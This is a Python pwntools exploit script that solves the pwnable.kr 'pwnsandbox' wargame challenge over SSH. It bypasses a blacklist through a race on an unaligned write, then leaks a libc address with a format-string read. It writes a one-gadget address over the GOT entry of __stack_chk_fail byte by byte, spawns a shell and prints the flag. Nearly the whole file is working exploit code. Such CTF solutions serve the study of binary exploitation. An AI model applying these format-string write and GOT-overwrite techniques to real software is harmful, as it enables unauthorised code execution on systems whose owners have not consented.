#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass guest --user pwnsandbox --path ./pwnsandbox
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pwnsandbox')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'pwnsandbox'
password = args.PASSWORD or 'guest'
remote_path = './pwnsandbox'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)
    if args.DEBUG:
        # pwnable.kr's gdbserver is broken, use gdbserver64 to shadow it
        shell.upload_file("gdbserver", "gdbserver64")
        shell.chmod("+x", "gdbserver64")

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.connect_remote("0.0.0.0", 9028)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x401369
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc = ELF("libc-2.23.so")

context.terminal = ["kitty"]

io = start()

# 115 has all bytes as 116 (get+printtf) but the LSB, 210 has the same LSB
# since the writes are unaligned, (pointer is at offset 0xf), the other thread can see the write to the LSb before it sees to write to the other bytes, which bypasses the blacklist.
code = [115, 210]
arg = 0

io.sendlineafter(b"how big is your program?:", str(len(code)).encode())
io.sendafter(b"give me your program:", bytes(code))
io.sendlineafter(b"input function argument:", str(arg).encode())

io.recvuntil(b"all set. have fun!\n")

def leak_libc_address(io: tube):
    io.sendline(b"%37$llx")  # offset of return address (to clone)
    return int(io.recvuntil(b"!", drop=True), 16)

def write_byte(io: tube, where: int, what: int):
    if what == 0:
        what = 256  # min write is 1 char

    fmt = f"%5${what}x".encode() + b"%8$hhn"
    fmt = fmt.ljust(16)
    fmt += p64(where)

    io.sendline(fmt)
    io.recvuntil(b"!")

def overwrite_got(io: tube, onegadget: int):
    for i, x in enumerate(p64(onegadget)):
        write_byte(io, exe.got["__stack_chk_fail"] + i, x)

def trigger_shell(io: tube):
    # oonegadget requires [rsp+0x30] = 0, overwrite stack with nulls to both trigger __stack_chk_fail and satisfy constraint
    io.sendline(b"\x00" * 0x60)
    io.recvuntil(b"!")

clone_address = leak_libc_address(io) - 109
libc.address = clone_address - libc.sym["clone"]

success(f"leaked libc base address: 0x{libc.address:x}")

overwrite_got(io, libc.address + 0x4527a)

success("overwrote got __stack_chk_fail -> onegadget")

info("triggering shell")

trigger_shell(io)

io.sendline(b"cat flag")
success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
